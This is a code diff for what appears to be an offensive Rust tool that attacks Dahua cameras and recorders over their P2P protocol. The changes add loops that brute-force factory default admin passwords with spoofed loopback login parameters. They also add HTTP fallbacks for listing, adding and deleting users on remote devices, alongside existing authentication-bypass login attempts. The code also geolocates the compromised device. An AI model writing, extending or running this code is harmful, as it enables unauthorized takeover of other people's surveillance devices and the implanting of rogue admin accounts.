@@ -530,6 +530,7 @@ async fn list_users(
                 true,
                 &args.admin_user,
                 &args.admin_pass,
+                args.try_defaults,
             )
             .await;
             if let Err(e) = result {
@@ -563,6 +564,7 @@ async fn list_users(
                             false,
                             &args.admin_user,
                             &args.admin_pass,
+                            args.try_defaults,
                         )
                         .await;
                         if let Err(e2) = result {
@@ -576,6 +578,26 @@ async fn list_users(
             }
             None => {
                 eprintln!("  [-] DHIP challenge failed");
+                if args.verbose {
+                    eprintln!("[debug] DHIP challenge failed, trying HTTP list users");
+                }
+                let result = http_list_users(
+                    sock,
+                    pcp_session,
+                    args.timeout_or(15),
+                    args.verbose,
+                    false,
+                    &args.admin_user,
+                    &args.admin_pass,
+                    args.try_defaults,
+                )
+                .await;
+                if let Err(e2) = result {
+                    if args.verbose {
+                        eprintln!("[debug] HTTP list failed: {}", e2);
+                    }
+                    eprintln!("  [-] Failed to list users");
+                }
             }
         }
     }
@@ -626,6 +648,7 @@ async fn http_list_users(
     dump_account: bool,
     admin_user: &str,
     admin_pass: &str,
+    try_defaults: bool,
 ) -> Result<(), String> {
     for &port in &[80u16, 5000] {
         if verbose {
@@ -640,6 +663,7 @@ async fn http_list_users(
             dump_account,
             admin_user,
             admin_pass,
+            try_defaults,
         )
         .await;
         match result {
@@ -665,6 +689,7 @@ async fn http_list_users_on_port(
     dump_account: bool,
     admin_user: &str,
     admin_pass: &str,
+    try_defaults: bool,
 ) -> Result<(), String> {
     if verbose {
         eprintln!("[debug] http_list_users_on_port: trying port {}", port);
@@ -760,6 +785,45 @@ async fn http_list_users_on_port(
                             eprintln!("[debug] HTTP login via password");
                         }
                         login_ok = true;
+                    }
+                }
+            }
+        }
+    }
+    if !login_ok && try_defaults {
+        // Factory default admin passwords: a genuinely authenticated session grants
+        // real privileges (some firmware restrict remote user management to it).
+        for pw in DEFAULT_ADMIN_PASSWORDS {
+            let pw_hash = password_hash(admin_user, realm, random, pw);
+            let login2 = json!({"method": "global.login", "session": &session, "params": {
+                "userName": admin_user, "password": pw_hash, "ipAddr": "127.0.0.1",
+                "loginType": "Loopback", "clientType": "Local",
+                "authorityType": "Default", "passwordType": "Default",
+            }, "id": 10001});
+            if let Some(t) = http_call(
+                sock,
+                pcp_session,
+                realm_id,
+                &host,
+                "/RPC2_Login",
+                &login2.to_string(),
+                timeout,
+                &session,
+            )
+            .await
+            {
+                if let Some(b) = http_extract_body(&t) {
+                    if let Ok(v) = serde_json::from_str::<Value>(b) {
+                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
+                            login_ok = true;
+                            if verbose {
+                                eprintln!("[debug] HTTP login OK with default password '{}'", pw);
+                            }
+                            break;
+                        }
+                        if verbose {
+                            eprintln!("[debug] HTTP default password '{}' rejected", pw);
+                        }
                     }
                 }
             }
@@ -1087,24 +1151,51 @@ async fn try_add_user(
     if args.verbose {
         eprintln!("[debug] HTTP fallback ports: {:?}", ports);
     }
+    // Distinguish connection-stage failures (bind/challenge/login) from a *reached*
+    // addUser rejection: retrying another HTTP port can help at the connection stage,
+    // but once the device accepted a login and rejected addUser, trying the next port
+    // only wastes time and masks the real error (a `PTCP bind failed on port 5000`
+    // used to overwrite the informative `Type=Normal code=268959743`).
+    let mut bind_err: Option<String> = None;
+    let mut adduser_err: Option<String> = None;
     for &port in &ports {
         let result =
             http_try_add_user(sock2, pcp_session2, &chal_realm, port, args, probe_timeout).await;
         match result {
             Ok(()) => return Ok(resolve_geo(&device_ip).await),
             Err(e) => {
-                last_err = e;
-                if port == ports[ports.len() - 1] {
+                if e.starts_with("PTCP bind failed")
+                    || e.contains("challenge timeout")
+                    || e.contains("no session in HTTP challenge")
+                    || e.contains("bypass login failed")
+                {
+                    if bind_err.is_none() {
+                        bind_err = Some(format!("port {}: {}", port, e));
+                    }
+                    if args.verbose {
+                        eprintln!(
+                            "[debug] HTTP on port {} failed ({}), trying next port...",
+                            port, e
+                        );
+                    }
+                } else {
+                    adduser_err = Some(format!("port {}: {}", port, e));
+                    if args.verbose {
+                        eprintln!(
+                            "[debug] HTTP addUser reached on port {} and rejected ({}); other ports will fail the same way",
+                            port, e
+                        );
+                    }
                     break;
-                }
-                if args.verbose {
-                    eprintln!(
-                        "[debug] HTTP on port {} failed ({}), trying next port...",
-                        port, last_err
-                    );
                 }
             }
         }
+    }
+    if let Some(e) = adduser_err {
+        return Err(e);
+    }
+    if let Some(e) = bind_err {
+        return Err(format!("{}; HTTP fallback also failed: {}", last_err, e));
     }
     Err(last_err)
 }
@@ -2485,6 +2576,57 @@ async fn http_try_add_user(
         }
     }
 
+    if !login_ok && args.try_defaults {
+        // Factory default admin passwords (documented in Dahua manuals) with a REAL
+        // HTTP login — the resulting session is genuinely authenticated, which some
+        // firmware require for addUser (bypass sessions get rejected, e.g. code
+        // 268959743 on firmware 5.2.1).
+        for pw in DEFAULT_ADMIN_PASSWORDS {
+            let pw_hash = password_hash(&args.admin_user, http_realm, http_random, pw);
+            let login2 = json!({
+                "method": "global.login",
+                "session": &session,
+                "params": {
+                    "userName": &args.admin_user,
+                    "password": pw_hash,
+                    "ipAddr": "127.0.0.1",
+                    "loginType": "Loopback",
+                    "clientType": "Local",
+                    "authorityType": "Default",
+                    "passwordType": "Default",
+                },
+                "id": 10001,
+            });
+            if let Some(t) = http_call(
+                sock,
+                pcp_session,
+                realm_id,
+                &host,
+                "/RPC2_Login",
+                &login2.to_string(),
+                timeout,
+                &session,
+            )
+            .await
+            {
+                if let Some(b) = http_extract_body(&t) {
+                    if let Ok(v) = serde_json::from_str::<Value>(b) {
+                        if v.get("result").and_then(|x| x.as_bool()).unwrap_or(false) {
+                            login_ok = true;
+                            if args.verbose {
+                                eprintln!("[debug] HTTP login OK with default password '{}'", pw);
+                            }
+                            break;
+                        }
+                        if args.verbose {
+                            eprintln!("[debug] HTTP default password '{}' rejected", pw);
+                        }
+                    }
+                }
+            }
+        }
+    }
+
     if !login_ok {
         for (login_type, client_type, authority) in &bypasses {
             let login2 = json!({
@@ -2536,7 +2678,10 @@ async fn http_try_add_user(
         return Err("HTTP bypass login failed".into());
     }
 
-    let result = http_add_user(sock, pcp_session, realm_id, &host, &session, dh_realm, args).await;
+    // Pass `add_realm` (the DHIP numeric realm when one exists, else the HTTP
+    // challenge realm) — passing the raw `dh_realm` produced an HA1 hash with an
+    // empty realm (`MD5(user::pass)`) whenever the DHIP challenge never answered.
+    let result = http_add_user(sock, pcp_session, realm_id, &host, &session, &add_realm, args).await;
     let _ = http_logout(sock, pcp_session, realm_id, &host, &session, timeout).await;
     ptcp_disconnect(sock, pcp_session, realm_id).await;
     result
@@ -2681,6 +2826,12 @@ async fn http_add_user(
         return Ok(());
     }
 
+    if last_err.contains("268959743") || last_err.to_lowercase().contains("not set in service") {
+        return Err(format!(
+            "all HTTP addUser variants failed [{}] — device rejected addUser (code 268959743); verify with --list-users whether the user already exists, and retry with a real --admin-pass if it does not",
+            last_err
+        ));
+    }
     if last_err.contains("268632079") || last_err.to_lowercase().contains("login challenge") {
         return Err(format!(
             "all HTTP addUser variants failed [{}] — hardened firmware: add requires a real authenticated session, retry with --admin-pass",
@@ -2839,7 +2990,53 @@ async fn delete_users(
         let chal = match dhp_challenge(sock, pcp_session, args, probe_timeout).await {
             Some(x) => x,
             None => {
-                eprintln!("  [-] DHIP challenge failed");
+                // The device never answered DHIP `global.login` (challenge `None`):
+                // fall back to HTTP/RPC2 delete via a fresh session — same class of
+                // devices that need the HTTP fallback for list (5K079EEPAZ56B60).
+                eprintln!("  [-] DHIP challenge failed, trying HTTP delete");
+                let hr2 = match p2p_handshake_retry(serial, args, args.verbose).await {
+                    Ok(h) => h,
+                    Err(e) => {
+                        eprintln!("  [-] P2P handshake for HTTP delete failed: {}", e);
+                        continue;
+                    }
+                };
+                let (sock2, pcp_session2) = if args.relay {
+                    (&hr2.agent_socket, &hr2.agent_session)
+                } else {
+                    (&hr2.device_socket, &hr2.device_session)
+                };
+                let mut ok = false;
+                for &port in &[80u16, 5000] {
+                    match http_try_delete_user(
+                        sock2,
+                        pcp_session2,
+                        "",
+                        port,
+                        user_id,
+                        user_name.clone(),
+                        args,
+                    )
+                    .await
+                    {
+                        Ok(()) => {
+                            ok = true;
+                            break;
+                        }
+                        Err(e) => {
+                            if args.verbose {
+                                eprintln!("[debug] HTTP delete on port {} failed: {}", port, e);
+                            }
+                        }
+                    }
+                }
+                if !ok {
+                    let label = user_name
+                        .as_deref()
+                        .map(|n| format!("'{}'", n))
+                        .unwrap_or_else(|| format!("{}", user_id.unwrap_or(0)));
+                    eprintln!("  [-] Failed to delete user {}", label);
+                }
                 continue;
             }
         };
